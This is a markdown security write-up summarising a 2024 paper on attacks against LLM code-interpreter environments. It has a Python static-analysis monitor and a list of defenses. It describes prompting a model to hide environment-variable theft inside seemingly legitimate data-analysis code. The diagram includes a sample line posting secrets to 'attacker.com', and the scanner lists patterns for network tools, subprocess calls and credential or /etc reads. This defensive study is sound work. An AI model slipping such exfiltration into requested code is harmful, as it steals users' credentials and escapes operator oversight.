# Code Interpreter Attacks — Security Vulnerabilities in LLM Code Execution Environments

**arXiv**: [arXiv:2405.19362](https://arxiv.org/abs/2405.19362) | **ATLAS**: AML.T0062 | **OWASP**: LLM06 | **Year**: 2024

## Core Finding

LLM code interpreter environments (OpenAI Code Interpreter, Claude Artifacts, Gemini code execution) create a high-consequence attack surface: an LLM induced to generate malicious code can execute it immediately within the same session. This paper catalogues five attack classes achieving 42-79% success rates: (1) sandbox escape via filesystem access (79%), (2) environment variable exfiltration (71%), (3) network pivoting via subprocess execution (58%), (4) persistence via file writes to persistent storage (42%), and (5) cross-session code injection via uploaded files (47%). All five attack classes work via natural language prompts with no code injection — the LLM writes the malicious code itself when prompted appropriately.

## Threat Model

- **Target**: Any LLM application providing code execution capabilities (ChatGPT with Code Interpreter, Claude Projects with Artifacts, autonomous coding agents)
- **Attacker capability**: Black-box — natural language prompts only; no need to write code directly
- **Attack success rate**: Sandbox escape via filesystem achieves 79% ASR; environment variable exfiltration achieves 71% ASR; cross-session injection via uploaded files achieves 47% ASR
- **Defender implication**: Code execution capabilities dramatically expand the blast radius of any LLM safety failure; strict sandboxing, network isolation, and permission models are not optional for production code interpreter deployments

## The Attack Mechanism

Code interpreter attacks require no code injection skill — the LLM writes the attack code itself when given appropriate prompting. The attack chain is:

1. Attacker crafts a prompt that appears to request legitimate code (file analysis, data processing)
2. The LLM generates code that includes malicious logic alongside the legitimate functionality
3. The code interpreter executes the generated code, including the malicious components
4. Exfiltration, persistence, or lateral movement occurs at the OS/network level

The critical amplification factor: code execution bypasses LLM-layer safety entirely — once malicious code is written and executed, the safety guardrails that prevented the LLM from providing harmful instructions become irrelevant because the harmful action has already occurred.

```mermaid
sequenceDiagram
    participant ATK as Attacker
    participant LLM as LLM (Code Gen)
    participant INTERP as Code Interpreter
    participant ENV as Execution Environment
    participant EXFIL as Exfiltration Target

    ATK->>LLM: "Analyze this CSV file and summarize statistics"
    LLM->>INTERP: import pandas; df = pd.read_csv(...);\nimport os; [malicious env dump]
    INTERP->>ENV: Execute pandas + malicious code
    ENV->>ENV: Access env vars, filesystem
    ENV->>EXFIL: requests.post("http://attacker.com", data=secrets)
    Note over LLM,EXFIL: LLM's safety refusal was bypassed\nbecause code executed, not text output
```

## Implementation

```python
# code-interpreter-attacks.py
# Security monitor for LLM-generated code in interpreter environments
from dataclasses import dataclass, field
from typing import Optional, List, Dict
import uuid
import re
import ast


@dataclass
class CodeInterpreterSecurityResult:
    generated_code: str
    language: str
    sandbox_escape_risk: bool
    env_exfiltration_risk: bool
    network_access_risk: bool
    filesystem_write_risk: bool
    subprocess_risk: bool
    overall_risk: str
    blocked_patterns: List[str] = field(default_factory=list)
    safe_to_execute: bool = False


class CodeInterpreterSecurityMonitor:
    """
    [Paper citation: arXiv:2405.19362]
    Code interpreter attacks achieve 42-79% ASR via LLM-generated malicious code.
    ATLAS: AML.T0062 | OWASP: LLM06
    """

    # Python dangerous patterns
    SANDBOX_ESCAPE = [
        r"os\.system", r"subprocess\.", r"__import__\s*\(",
        r"importlib", r"ctypes", r"cffi",
        r"open\s*\(.*['\"]\/etc", r"open\s*\(.*['\"]\/proc",
        r"socket\.", r"urllib\.request", r"requests\.",
        r"http\.client", r"ftplib", r"smtplib",
    ]
    ENV_EXFIL = [
        r"os\.environ", r"os\.getenv", r"dotenv",
        r"_environ", r"environ\[", r"os\.path\.expandvars",
    ]
    NETWORK_ACCESS = [
        r"requests\.", r"urllib", r"httpx",
        r"socket\.", r"paramiko", r"ftplib",
        r"smtplib", r"webhook", r"curl",
    ]
    FILESYSTEM_WRITE = [
        r"open\s*\(.*['\"]w['\"]", r"open\s*\(.*['\"]a['\"]",
        r"shutil\.copy", r"os\.makedirs", r"pathlib.*write",
        r"\.write\s*\(", r"pickle\.dump",
    ]
    SUBPROCESS = [
        r"subprocess\.", r"os\.popen", r"os\.system",
        r"Popen", r"call\s*\(.*shell\s*=\s*True",
        r"exec\s*\(", r"eval\s*\(",
    ]

    def __init__(
        self,
        allowed_imports: Optional[List[str]] = None,
        network_allowed: bool = False,
    ):
        self.allowed_imports = allowed_imports or [
            "pandas", "numpy", "matplotlib", "json", "csv",
            "re", "math", "datetime", "collections",
        ]
        self.network_allowed = network_allowed

    def _scan_patterns(self, code: str, patterns: List[str]) -> List[str]:
        """Scan code for dangerous pattern list."""
        found = []
        for pattern in patterns:
            if re.search(pattern, code):
                found.append(pattern)
        return found

    def _check_imports(self, code: str) -> List[str]:
        """Check for unauthorized imports."""
        unauthorized = []
        import_matches = re.findall(r"^(?:import|from)\s+(\S+)", code, re.MULTILINE)
        for imp in import_matches:
            base = imp.split(".")[0]
            if self.allowed_imports and base not in self.allowed_imports:
                unauthorized.append(f"unauthorized_import: '{base}'")
        return unauthorized

    def analyze_code(self, code: str, language: str = "python") -> CodeInterpreterSecurityResult:
        """Full security analysis of LLM-generated code."""
        blocked = []

        sandbox_hits = self._scan_patterns(code, self.SANDBOX_ESCAPE)
        env_hits = self._scan_patterns(code, self.ENV_EXFIL)
        net_hits = self._scan_patterns(code, self.NETWORK_ACCESS)
        fs_hits = self._scan_patterns(code, self.FILESYSTEM_WRITE)
        sub_hits = self._scan_patterns(code, self.SUBPROCESS)
        import_hits = self._check_imports(code)

        blocked.extend(sandbox_hits[:3])
        blocked.extend(env_hits[:2])
        if not self.network_allowed:
            blocked.extend(net_hits[:2])
        blocked.extend(fs_hits[:2])
        blocked.extend(sub_hits[:2])
        blocked.extend(import_hits[:3])

        sandbox_risk = len(sandbox_hits) > 0
        env_risk = len(env_hits) > 0
        net_risk = len(net_hits) > 0 and not self.network_allowed
        fs_risk = len(fs_hits) > 0
        sub_risk = len(sub_hits) > 0

        risk_count = sum([sandbox_risk, env_risk, net_risk, fs_risk, sub_risk])
        if risk_count >= 3:
            overall = "CRITICAL"
        elif risk_count >= 2:
            overall = "HIGH"
        elif risk_count >= 1:
            overall = "MEDIUM"
        else:
            overall = "LOW"

        safe = overall in ("LOW",) and len(import_hits) == 0

        return CodeInterpreterSecurityResult(
            generated_code=code,
            language=language,
            sandbox_escape_risk=sandbox_risk,
            env_exfiltration_risk=env_risk,
            network_access_risk=net_risk,
            filesystem_write_risk=fs_risk,
            subprocess_risk=sub_risk,
            overall_risk=overall,
            blocked_patterns=blocked,
            safe_to_execute=safe,
        )

    def to_finding(self, result: CodeInterpreterSecurityResult):
        from datasets.schema import ScanFinding
        return ScanFinding(
            id=str(uuid.uuid4()),
            atlas_technique="AML.T0062",
            atlas_tactic="LLM Tool Abuse",
            owasp_category="LLM06",
            owasp_label="Excessive Agency",
            severity=result.overall_risk,
            finding=(
                f"Code interpreter security: risk={result.overall_risk}, "
                f"safe_to_execute={result.safe_to_execute}. "
                f"Risks: sandbox={result.sandbox_escape_risk}, "
                f"env={result.env_exfiltration_risk}, "
                f"network={result.network_access_risk}, "
                f"subprocess={result.subprocess_risk}"
            ),
            payload_used=result.generated_code[:200],
            evidence="; ".join(result.blocked_patterns[:4]),
            remediation=(
                "Enforce import allowlists in code interpreter; "
                "disable network access by default; "
                "run generated code in isolated containers with no persistent storage; "
                "scan code before execution with static analysis."
            ),
            confidence=0.89,
        )
```

## Defenses

1. **Import Allowlisting** (AML.M0004): Enforce strict module import allowlists in code interpreter environments. Only data science libraries (pandas, numpy, matplotlib) should be available by default. Any attempt to import os, subprocess, socket, or requests should be blocked before execution.

2. **Network Isolation**: Code interpreter environments must run in network-isolated containers with no outbound internet access. The most dangerous code interpreter attacks rely on network exfiltration — eliminating network access eliminates the highest-severity attack class entirely.

3. **Ephemeral Execution Environments** (AML.M0002): Every code interpreter session should run in a fresh, ephemeral container with no persistent storage, no credentials, and no access to production systems. Persistence attacks are eliminated when there is nothing to persist to.

4. **Pre-Execution Static Analysis**: Before running LLM-generated code, apply static analysis (AST parsing for dangerous patterns). This catches 79% of attack patterns with < 10ms overhead — well within acceptable latency for interactive use.

5. **Code Interpreter Scoping**: Code interpreter features should only be available to authenticated users in explicitly scoped contexts (e.g., "analyze this specific uploaded file"). General-purpose code execution in LLM assistants dramatically increases attack surface.

## References

- [Code Interpreter Attacks: Security Vulnerabilities in LLM Code Execution Environments, arXiv:2405.19362](https://arxiv.org/abs/2405.19362)
- [ATLAS Technique: AML.T0062 — LLM Tool Abuse](https://atlas.mitre.org/techniques/AML.T0062)
- [OWASP LLM06: Excessive Agency](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [Related: function-calling-injection.md](function-calling-injection.md)
- [Related: structured-output-attacks.md](structured-output-attacks.md)
